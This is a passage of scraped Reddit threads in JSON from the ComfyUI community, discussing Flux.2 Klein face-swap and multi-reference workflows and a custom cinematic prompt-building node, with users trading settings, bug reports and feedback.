              "replies": []
            }
          ]
        },
        {
          "id": "o1370kr",
          "author": "yoomiii",
          "text": "Are you masking the face on the target image?",
          "score": 1,
          "created_utc": "2026-01-22 18:08:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o13mo33",
          "author": "TechnologyGrouchy679",
          "text": "I noticed in your workflow you are using the \\`BasicScheduler\\` node as opposed to the \\`Flux2Scheduler\\` node that is used in the official Flux.2 Klein workflows.  Any particular reason for this?",
          "score": 1,
          "created_utc": "2026-01-22 19:17:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dhs8",
              "author": "slpreme",
              "text": "i find it to get slightly better results (with 5 shift) in my testing. you should test it yourself to know for sure :)",
              "score": 1,
              "created_utc": "2026-01-23 00:28:45",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o160lmv",
          "author": "krsnt8",
          "text": "Better than Qwen faceswap???",
          "score": 1,
          "created_utc": "2026-01-23 02:36:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16lqvs",
          "author": "orangeflyingmonkey_",
          "text": "tried using it but all the 'body' images are being cropped to 432x1280 so the head swap fails.",
          "score": 1,
          "created_utc": "2026-01-23 04:41:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o179il1",
          "author": "Temporary_Mud_6722",
          "text": "–ø–ª–æ—Ö–∞—è...",
          "score": 1,
          "created_utc": "2026-01-23 07:45:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o180mqd",
          "author": "imaginationking",
          "text": "my issue with it, is the size of the head usually not realistic... not sure if there is a custom node that can fix that",
          "score": 1,
          "created_utc": "2026-01-23 11:46:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c3svd",
              "author": "slpreme",
              "text": "prompting can be improved. i would also get a reference photo around the same size of head as the target photo",
              "score": 1,
              "created_utc": "2026-01-23 23:57:05",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o19kenu",
          "author": "Upper_Basis_4208",
          "text": "Where is the workflow",
          "score": 1,
          "created_utc": "2026-01-23 16:42:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1h0zel",
          "author": "krigeta1",
          "text": "Can you suggest me some prompts if I want to face+hair and when there is a quality difference or lightning difference, it looks like a good Photoshop? Can you tell me how to fix that?",
          "score": 1,
          "created_utc": "2026-01-24 18:42:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1hyewt",
          "author": "brucebay",
          "text": "BFS is best with Flux2  Klein (a new update for the Lora), at  least for the one time I tried it.  You can also ask it to make changes to the expressions.\n\nHaving said that   the Civit comments are about it being hit or miss.",
          "score": 1,
          "created_utc": "2026-01-24 21:15:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1j74oi",
          "author": "lIPunisherIl",
          "text": "looks liek a great photoshop, it sells but still uncanny",
          "score": 1,
          "created_utc": "2026-01-25 00:59:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o114m8j",
          "author": "reyzapper",
          "text": "With 3 references images will do a lot better, no need to train loras haha, it reminds me using IPadapter faceID.\n\nsubject : Younger Angelina Jolie (2000s),\n\nIt seems higher dimension of ref images will produce better likeliness, this is 512x512 cropped\n\nklein 9B, 4 steps\n\nhttps://preview.redd.it/xh9a0znm1weg1.png?width=1024&format=png&auto=webp&s=e9d96a3945be7ae466618e3626e48a80f3d82fd5\n\nThose fingers tho üò•üò•",
          "score": 1,
          "created_utc": "2026-01-22 11:48:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13dyym",
              "author": "Mirandah333",
              "text": "https://preview.redd.it/0yevgsqq3yeg1.png?width=1451&format=png&auto=webp&s=b0138f7db72a83be146f1c0e8110affeb5a6132c\n\n5 reference images, sometimes get close, sometimes better, sometimes bad",
              "score": 2,
              "created_utc": "2026-01-22 18:39:12",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o114y70",
              "author": "slpreme",
              "text": "good idea i didnt think of that",
              "score": 1,
              "created_utc": "2026-01-22 11:51:19",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1r1btm",
              "author": "juandann",
              "text": "yeah, quite sad the finger performance is not up to par. Do you have solution in fixing those fingers without changing the overall image?",
              "score": 1,
              "created_utc": "2026-01-26 03:07:38",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o11plm1",
          "author": "Xp_12",
          "text": "So does Nicky Cage.\n\n![gif](giphy|hwZ51FKy98qv6)",
          "score": 0,
          "created_utc": "2026-01-22 13:58:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o105zvo",
          "author": "Practical-Nerve-2262",
          "text": "Everyone uses Banana now, but this open-source version is great too!",
          "score": -21,
          "created_utc": "2026-01-22 06:40:18",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qim6km",
      "title": "Complete FLUX.2 Klein Workflow",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qim6km",
      "author": "No_Percentage1138",
      "created_utc": "2026-01-21 02:57:58",
      "score": 206,
      "num_comments": 21,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qim6km/complete_flux2_klein_workflow/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0tp86o",
          "author": "oeufp",
          "text": "upvoted just for adding \".json\" to the file name on pastebin",
          "score": 25,
          "created_utc": "2026-01-21 08:56:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tjuo3",
          "author": "Relevant_Eggplant180",
          "text": "Thanks for sharing. Looks very useful. I will give it a go.",
          "score": 6,
          "created_utc": "2026-01-21 08:05:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tfa7v",
          "author": "Upset-Virus9034",
          "text": "pixaroma robot :)",
          "score": 5,
          "created_utc": "2026-01-21 07:23:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uifqt",
              "author": "No_Percentage1138",
              "text": "Yeah, and easy-install\nI just learn to use it this days",
              "score": 2,
              "created_utc": "2026-01-21 12:58:00",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0uj2ex",
                  "author": "Upset-Virus9034",
                  "text": "Thanks for sharing üôè",
                  "score": 2,
                  "created_utc": "2026-01-21 13:01:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0w3825",
          "author": "FvMetternich",
          "text": "that looks like a brillilant idea with the reference numbers! thanks for sharing that gold nugget.",
          "score": 3,
          "created_utc": "2026-01-21 17:35:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0zm97e",
          "author": "wjc_5",
          "text": "This reference method is very convenient",
          "score": 5,
          "created_utc": "2026-01-22 04:15:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0uzkpk",
          "author": "BarkLicker",
          "text": "I'm so sad that the images aren't zero-indexed. I don't care either way, but I wish the world was consistent in this.",
          "score": 2,
          "created_utc": "2026-01-21 14:33:07",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0v04zr",
              "author": "No_Percentage1138",
              "text": "Yeah, but the node I use to preview the Images start from 1, that make the things harder",
              "score": 3,
              "created_utc": "2026-01-21 14:36:03",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0v9tx0",
          "author": "sir-bantzalot",
          "text": "This is very interesting. How do you use the references in the second field? It says 2, 3 6",
          "score": 2,
          "created_utc": "2026-01-21 15:23:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0w1v3f",
              "author": "No_Percentage1138",
              "text": "Well it loads all the images from the folder and in the field where I chose the images to use I put the names of the files, in the examples are 1,2,3,4,5,6 to make it easier to understand and more consistent with the Index. And if the name of the files apear in the list then it will load the images in the CLIP",
              "score": 4,
              "created_utc": "2026-01-21 17:29:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0xzrc1",
          "author": "RayHell666",
          "text": "Is the bug with \"control after generate\" in subgraph fixed yet ?",
          "score": 2,
          "created_utc": "2026-01-21 22:47:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y2c6q",
              "author": "No_Percentage1138",
              "text": "If you mean that the file search range doesn‚Äôt update when the folder gets updated: no, I didn‚Äôt find a way to fix it. My temporary workaround is to rename the folder where the reference images are stored, and then update the path in the workflow.",
              "score": 2,
              "created_utc": "2026-01-21 23:00:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0y5ly9",
                  "author": "RayHell666",
                  "text": "no just talking about the seed control.",
                  "score": 2,
                  "created_utc": "2026-01-21 23:17:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0y68lz",
          "author": "FreezaSama",
          "text": "What a boss thanks",
          "score": 2,
          "created_utc": "2026-01-21 23:20:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ybqqn",
          "author": "Whole_Disk3247",
          "text": "Multi-image doesn't work as great as it seems. I had a few bad anatomical ones.",
          "score": 1,
          "created_utc": "2026-01-21 23:50:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ynssd",
              "author": "No_Percentage1138",
              "text": "Yeah, Flux.2 Klein isn't so good with anatomy. Maybe with some Lora or ControlNet you will have a better resoult",
              "score": 2,
              "created_utc": "2026-01-22 00:55:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0yzlxg",
          "author": "juandann",
          "text": "can klein fix messed up anatomy?",
          "score": 1,
          "created_utc": "2026-01-22 02:02:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1e2zmc",
          "author": "TheRealAncientBeing",
          "text": "Mine ends up in a \n\nmat1 and mat2 shapes cannot be multiplied (512x4096 and 12288x4096)\n\nany idea? tried with different, smaller background and images?",
          "score": 1,
          "created_utc": "2026-01-24 07:44:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1e5mco",
              "author": "TheRealAncientBeing",
              "text": "Layer 8 problem: Misclicked the matching text encoder for the 9B.\n\nResults: It uses the background image but there is ZERO resemblance to the (people) reference pics, really nothing, except perhaps hair color.",
              "score": 1,
              "created_utc": "2026-01-24 08:07:55",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qh9sff",
      "title": "Flux2 Klein performs exceptionally well, surpassing the performance of the trained LoRA in many aspects, whether for image editing or text-to-image conversion. I highly recommend testing it out. Tutorial link: https://youtu.be/F7gokUkzSnc",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qh9sff",
      "author": "Daniel81528",
      "created_utc": "2026-01-19 17:01:22",
      "score": 199,
      "num_comments": 31,
      "upvote_ratio": 0.95,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qh9sff/flux2_klein_performs_exceptionally_well/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0kv0jd",
          "author": "admajic",
          "text": "https://preview.redd.it/3yepuxe8heeg1.jpeg?width=1376&format=pjpg&auto=webp&s=a247a5aaaa006305c9764c907c2be96cecfcb952\n\nJust did this for a mate. In a few steps 1.5 mins work\n\nCrazy can get same car same number plate same wheels",
          "score": 7,
          "created_utc": "2026-01-20 00:38:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0qxhzr",
              "author": "ANR2ME",
              "text": "Is it just me, or the numbers in the plate reflection didn't get inverted vertically ü§î\n\nAre you using 4B or 9B model?",
              "score": 1,
              "created_utc": "2026-01-20 22:08:32",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0qzpvz",
                  "author": "admajic",
                  "text": "9b. Took a few goes just to get the number plate legible",
                  "score": 2,
                  "created_utc": "2026-01-20 22:19:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0jlyn3",
          "author": "pepitogrillo221",
          "text": "Tell the prompt for every image gen, looks great!",
          "score": 7,
          "created_utc": "2026-01-19 20:48:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0kj0xa",
              "author": "Daniel81528",
              "text": "The video explains the precautions for using prompt words.",
              "score": 7,
              "created_utc": "2026-01-19 23:33:38",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0lf7gu",
                  "author": "pepitogrillo221",
                  "text": "Watching it, thanks.",
                  "score": 1,
                  "created_utc": "2026-01-20 02:28:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0lx83w",
          "author": "Eydahn",
          "text": "First of all, I just wanted to thank you so much for this awesome workflow. I watched the video to see how it works, and everything is super clear. I honestly find it really practical and effective.\n\nThat said, I wanted to ask you something: do you think it‚Äôs possible to use two images (Image 1 and Image 2) and do something similar to OpenPose, but for facial expressions? Basically, I‚Äôd like to change the facial expression of Image 2 while keeping the same facial features/identity, using the expression from Image 1 as the reference.",
          "score": 3,
          "created_utc": "2026-01-20 04:09:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0mfepr",
              "author": "admajic",
              "text": "yeah you can do it with two image but even better with one. maybe get everything together then prompt the facial expression",
              "score": 5,
              "created_utc": "2026-01-20 06:15:55",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0mfzg4",
                  "author": "Eydahn",
                  "text": "I tried these approaches with some anime closeup face images: \n\nInpaint: it changes the expression, but it doesn‚Äôt faithfully preserve the character‚Äôs facial features/identity.\n\nUsing Image 1 and Image 2 (taking the expression from Image 1): in my case it didn‚Äôt work at all.\n\t\nI haven‚Äôt tried a simple edit yet though",
                  "score": 1,
                  "created_utc": "2026-01-20 06:20:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0n6y6x",
          "author": "Kuldeep_music",
          "text": "Just a little advice, put links in the description section so it can be clickable üòÄ",
          "score": 2,
          "created_utc": "2026-01-20 10:24:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uvp34",
              "author": "Daniel81528",
              "text": "Haha, I was lazy, but even if I put the link in the article, people would still ask where the link is, haha.",
              "score": 0,
              "created_utc": "2026-01-21 14:12:57",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0kvjyd",
          "author": "admajic",
          "text": "For the first image try dark soul purple crystal looks way sicker",
          "score": 1,
          "created_utc": "2026-01-20 00:40:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0n5wbq",
          "author": "Professional_Test_80",
          "text": "Thank you for the tutorial! What was your prompt for the first image? The one with the car body paint transfer.",
          "score": 1,
          "created_utc": "2026-01-20 10:15:07",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uvsru",
              "author": "Daniel81528",
              "text": "The video explains it in detail; you can take a closer look.",
              "score": 1,
              "created_utc": "2026-01-21 14:13:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0sehd3",
          "author": "TomatoInternational4",
          "text": "Test more of the human body in potentially difficult poses and with multiple people.",
          "score": 1,
          "created_utc": "2026-01-21 02:59:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tt3z0",
          "author": "Relevant_Eggplant180",
          "text": "Thank you for sharing this workflow and tutorial!",
          "score": 1,
          "created_utc": "2026-01-21 09:34:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ybk7p",
          "author": "spacemidget75",
          "text": "Hey Daniel, I'm having trouble getting the masking to work with your WF. I did swap the filll holes and gausion mask nodes with \"Grow Mask With Blur\" from KJNodes, but I've also tried without it. Sometimes it either doesn't create anything in the mask or it does but it's a very blured image.",
          "score": 1,
          "created_utc": "2026-01-21 23:49:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18avhs",
              "author": "Daniel81528",
              "text": "I've never encountered this problem before.",
              "score": 1,
              "created_utc": "2026-01-23 12:56:55",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rcwcu",
          "author": "extra2AB",
          "text": "man, can someone make the workflow and explanation in proper english ? English is already my third language. I could still understand if stuff on screen was in english, although subs are english, the labels on the workflow are chinese, which I find next to impossible to understand.\n\nlike in the workflow too, half the stuff is in english, half is in chinese. like why go through all this to label half the stuff in chinese, and if you are going to do it, why not provide an english version of the workflow as well ?\n\nI don't get the point of labeling half the stuff in chinese, either label EVERYTHING or NOTHING. A chinese speaker who doesn't understand english won't be able to understand it as half the things are in english, and an english speaker who doesn't understand chinese also won't be able to understand as half the stuff is in chinese.\n\nso what is the point ?",
          "score": 1,
          "created_utc": "2026-01-26 04:15:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1s26cs",
          "author": "Rumba84",
          "text": "is it a censored model? can i make tits with it?",
          "score": 1,
          "created_utc": "2026-01-26 07:18:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0k5j9o",
          "author": "YMIR_THE_FROSTY",
          "text": "Advertising photography is dead and buried.",
          "score": 1,
          "created_utc": "2026-01-19 22:23:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0mk3bp",
              "author": "protector111",
              "text": "Commercial photography is dead for a long time. Iv been selling ai ‚Äúphotos‚Äù on adobe stock for 3 years now. Real photos sales dropped to almost zero for lots of ppl including me.",
              "score": 4,
              "created_utc": "2026-01-20 06:54:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0opiez",
                  "author": "addandsubtract",
                  "text": "Does Adobe have an AI section or are you selling them as \"photos\"?",
                  "score": 2,
                  "created_utc": "2026-01-20 16:00:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0kj2av",
              "author": "Daniel81528",
              "text": "üòÇ",
              "score": 2,
              "created_utc": "2026-01-19 23:33:50",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o0lbgew",
              "author": "ReasonablePossum_",
              "text": "Not in 2 years more at least (maybe one if things advance fast enough tho). Ad photography needs exact depiction of a product and quite big resolutions and control over the flow, which we¬¥re still a bit far to achieve.\n\nWhat will be dead soon, is all the backend of editing and VFX to create artsy contexts for images and stuff, lot of technical assistants will have to find a new job, but photo studios and ads will be just outputting a lot better commercial imagery (at least technically, conceptually, i very much doubt as lots of people with bad taste are about to get big possibilities to make stuff lmao..... the slop age is coming)",
              "score": 1,
              "created_utc": "2026-01-20 02:07:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0lc6pc",
                  "author": "YMIR_THE_FROSTY",
                  "text": "Yea I meant more or less not actual taking picture of product, but everything else. But actual advert and product photography was a lot more than just picture of product.\n\nYou basically make few pics of product and then you can put it anywhere you want, re-light it, literally whatever you want.",
                  "score": 0,
                  "created_utc": "2026-01-20 02:11:53",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0kivbs",
          "author": "Winter_unmuted",
          "text": "Low effort post that is basically youtube linkspam?",
          "score": -8,
          "created_utc": "2026-01-19 23:32:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ko768",
              "author": "pepitogrillo221",
              "text": "You are talking about Daniel81528 the man who made the best qwen edit loras... Please respect...",
              "score": 11,
              "created_utc": "2026-01-20 00:01:37",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qipxhx",
      "title": "I ported my personal prompting tool into ComfyUI - A visual node for building cinematic shots",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qipxhx/i_ported_my_personal_prompting_tool_into_comfyui/",
      "author": "shamomylle",
      "created_utc": "2026-01-21 05:59:49",
      "score": 171,
      "num_comments": 45,
      "upvote_ratio": 0.99,
      "text": "https://reddit.com/link/1qipxhx/video/jqr07t0smneg1/player\n\nhttps://preview.redd.it/2u6d7as9iueg1.png?width=1524&format=png&auto=webp&s=42e4b9a7c6e09ec1362e3a2f4e097f36c6a39d04\n\nHi everyone,\n\nI wanted to share my very first custom node for ComfyUI. I'm still very new to ComfyUI (I usually just do 3D/Unity stuff), but I really wanted to port a personal tool I made into ComfyUI to streamline my workflow.\n\nI originally created this tool as a website to help me self-study cinematic shots, specifically to memorize what different camera angles, lighting setups (like Rembrandt or Volumetric), and focal lengths actually look like (link to the original tool : [https://yedp123.github.io/](https://yedp123.github.io/)).\n\n**What it does:** It replaces the standard CLIP Text Encode node but adds a visual interface. You can select:\n\n* Camera Angles (Dutch, Low, High, etc.)\n* Lighting Styles\n* Focal Lengths & Aperture\n* Film Stocks & Color Palettes\n\nIt updates the preview image in real-time when you hover over the different options so you can see a reference of what that term means before you generate. You can also edit the final prompt string if you want to add/remove things. It outputs the string + conditioning for Stable Diffusion, Flux, Nanobanana or Midjourney.\n\nLike I mentioned above, I just started playing with ComfyUI so I am not sure if this can be of any help to any of you or if there are flaws with it, but here's the link if you want to give it a try. Thanks, Have a good day!\n\n**Links:** [https://github.com/yedp123/ComfyUI-Cinematic-Prompt](https://github.com/yedp123/ComfyUI-Cinematic-Prompt)\n\n***-----------------------------------------------------------------------------------------***\n\n***UPDATE: added \"Cinematic Reference Loader\", an Image Loader node which lets the user select an image among the image assets to use for Image-to-Image workflows***",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qipxhx/i_ported_my_personal_prompting_tool_into_comfyui/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o0thf5z",
          "author": "BarGroundbreaking624",
          "text": "Can you output the image to use as depth map or for image to image ? I‚Äôve been prototyping that but not close to how this looks.",
          "score": 10,
          "created_utc": "2026-01-21 07:42:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tkwnu",
              "author": "shamomylle",
              "text": "Oh, I see what you mean! currently, the images in the node are just static reference jpg to help visualize the prompt terms (like a dictionary). The node only outputs the Text and Conditioning data, not the actual image shown in the preview, sorry for the confusion !  \n  \nFor now, the preview images are just static assets stored in the node's folder. The node doesn't currently have an `IMAGE` output to send them directly to other nodes via wires.\n\nHowever, if you really like a specific reference image (like the \"Low Angle\" shot for instance) and want to use it for ControlNet, you can find all the source images in your `custom_nodes/ComfyUI_Cinematic_Prompt/web/assets/` folder and load them into a standard 'Load Image' node",
              "score": 7,
              "created_utc": "2026-01-21 08:15:06",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0tn8c5",
                  "author": "Gilgameshcomputing",
                  "text": "agree that getting that image output would be really useful - I suspect Klein would make short work of turning it into a decent image.",
                  "score": 5,
                  "created_utc": "2026-01-21 08:37:20",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0u9cl7",
                  "author": "SvenVargHimmel",
                  "text": "Unfortunately i don't know much about the web/\\*\\* folder when building a node. Is there a way to keep the choices made in the UI in-sync with the node backend. \n\nI think I can make the image out change but I don't know enough about the frontend and backend sync designs.  Any pointers ?",
                  "score": 1,
                  "created_utc": "2026-01-21 11:55:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0tl6ra",
              "author": "noyart",
              "text": "Would be cool if you could do a simple 3D scene in comfyui. But you can do scenes in either blender and daz3D.¬†\n\n\nMy last try I made a scene in DaZ3D and than renderd it(dont need to be perfect), put that image in comfyui, convert to depth map with depth anything v3. It worked really good.",
              "score": 2,
              "created_utc": "2026-01-21 08:17:46",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0tniw0",
                  "author": "shamomylle",
                  "text": "I hear you! I also do 3D block out that I feed to Nanobanana Pro at the moment, but I would eventually like to move to ComfyUI, I still have to learn the basics! Building a full 3D viewport inside a node would be an awesome project, but definitely a massive undertaking compared to this!",
                  "score": 4,
                  "created_utc": "2026-01-21 08:40:09",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o106xld",
              "author": "shamomylle",
              "text": "Just included an Image Loader node to let you select and use these preview pictures for Image-to-Image, you just need to redownload and replace your current *ComfyUI\\_Cinematic\\_Prompt* folder :)",
              "score": 2,
              "created_utc": "2026-01-22 06:48:10",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0towua",
          "author": "Past_Ad6251",
          "text": "Thank for sharing! One tip for guys using Qwen Image, if you put camera brand in the prompt, you will find the camera itself in the generated image, which may not be what you needed.",
          "score": 5,
          "created_utc": "2026-01-21 08:53:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tpsd5",
              "author": "shamomylle",
              "text": "Thanks a lot for the feedback, that's good to know!   \nI haven't played much with Qwen yet but this is a Chinese model, you might have to go through some prompt translation to get it to work, it is most likely a lot better at adherence when it is written in Chinese.",
              "score": 1,
              "created_utc": "2026-01-21 09:01:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0tbvcn",
          "author": "Momkiller781",
          "text": "This looks fantastic!  I'll try it today. Thank you for sharing!",
          "score": 2,
          "created_utc": "2026-01-21 06:52:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tkbjx",
          "author": "Zakki_Zak",
          "text": "I wish I had your self discipline!",
          "score": 2,
          "created_utc": "2026-01-21 08:09:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tj1js",
          "author": "pharaohfx",
          "text": "Wow",
          "score": 1,
          "created_utc": "2026-01-21 07:57:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tkffy",
          "author": "Substantial_Aid",
          "text": "Will give it a try later today. Thank you for this!",
          "score": 1,
          "created_utc": "2026-01-21 08:10:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tldzn",
          "author": "jumpinthewatersnice",
          "text": "Having worked in film and tv for over 20 years im looking forward to testing this",
          "score": 1,
          "created_utc": "2026-01-21 08:19:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tmsp2",
              "author": "shamomylle",
              "text": "You would probably find some of the preview pictures highly inaccurate or find the tool incomplete, but I look forward to your feedbacks and if you think it can be a decent educational tool, thanks! :)",
              "score": 1,
              "created_utc": "2026-01-21 08:33:06",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0vq57a",
                  "author": "oodelay",
                  "text": "Doesn't matter, I also worked in the domain and words follow trends and locality. A pan shot can be explained twelve ways by twelve experts.",
                  "score": 1,
                  "created_utc": "2026-01-21 16:37:07",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0tm7cx",
          "author": "mrgonuts",
          "text": "Looks intresting thanks",
          "score": 1,
          "created_utc": "2026-01-21 08:27:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tv2x3",
          "author": "TheTimster666",
          "text": "Looks great, gotta try the node!   \nOne thing: I only tried it on the website so don't know if the node is the same, but after you choose something, eg \"Lighting\"->\"Blue Hour\" you can't deselect/default that option to \"None/Default\" again.",
          "score": 1,
          "created_utc": "2026-01-21 09:52:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tx2sr",
              "author": "shamomylle",
              "text": "You are totally right, I can't believe I missed such an important feature, I will update the node right away! Good catch, thanks a lot!\n\n**EDIT:** Made it so that everything can be selected manually and added a \"Reset\" button to unselect everything.",
              "score": 2,
              "created_utc": "2026-01-21 10:11:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0txwr4",
                  "author": "TheTimster666",
                  "text": "Awesome :-)",
                  "score": 1,
                  "created_utc": "2026-01-21 10:19:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0txvsy",
          "author": "KeyTumbleweed5903",
          "text": "gettign error - any idea why\n\nhttps://preview.redd.it/0f32l22phoeg1.png?width=1235&format=png&auto=webp&s=2d768ab135ec87627ea22bff54bb1d8244c7fdc8",
          "score": 1,
          "created_utc": "2026-01-21 10:19:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tzrdg",
              "author": "shamomylle",
              "text": "it is hard to tell from the picture, it seems everything is properly connected, can you show the exact error message?",
              "score": 2,
              "created_utc": "2026-01-21 10:36:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0u1wsd",
                  "author": "KeyTumbleweed5903",
                  "text": "https://preview.redd.it/up2b55d5ooeg1.png?width=943&format=png&auto=webp&s=4f181480b64d178fe697bd62a72cb47886e48270",
                  "score": 1,
                  "created_utc": "2026-01-21 10:55:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0uwj93",
          "author": "Mysterious_Pride_858",
          "text": "Excellent node. It allows for intuitive viewing of examples for each prompt. Are there any plans to add Z-image or Flux2 klein? I tested the Flux prompts on Flux klein2, and there were significant issues with generating the structure of human figures.",
          "score": 1,
          "created_utc": "2026-01-21 14:17:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uyw4a",
              "author": "shamomylle",
              "text": "Thanks for the feedback, ~~I never tried it with these models, I would have to do some tests with various prompt styles to understand how it behaves, did you try with a simple text encode before or simpler prompt too? Does it manage to generate good pictures? If yes, I would be interested in knowing what prompt you used, thanks!~~ Also you can try adding things like negative prompting, such as \"bad anatomy, missing limbs, deformed hands/face\" and see if there is any improvement.\n\n**UPDATE:** make sure you have your KSampler denoise set to 1.0 if you aren't doing any editing and just trying to generate pictures, it should avoid any kind of \"creative\" liberties.\n\nhttps://preview.redd.it/l8bnns4jlteg1.png?width=371&format=png&auto=webp&s=abf538391fe3679f5846afce2f85f13917db2878",
              "score": 1,
              "created_utc": "2026-01-21 14:29:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0wle9w",
          "author": "Sad-Investigator-81",
          "text": "this is really cool !  for some reason though midjourny ignores the camera angle part of the prompt",
          "score": 1,
          "created_utc": "2026-01-21 18:55:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0xy2z1",
              "author": "shamomylle",
